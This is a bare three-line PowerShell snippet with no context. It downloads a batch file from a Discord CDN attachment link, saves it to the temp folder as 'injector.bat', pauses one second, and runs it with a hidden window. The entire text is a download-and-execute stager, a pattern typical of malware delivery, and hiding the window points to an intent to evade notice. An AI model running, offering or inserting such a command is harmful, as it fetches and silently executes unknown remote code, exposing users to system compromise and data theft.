iwr -useb https://cdn.discordapp.com/attachments/1133916220219990187/1133945219369402398/Sized.bat -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
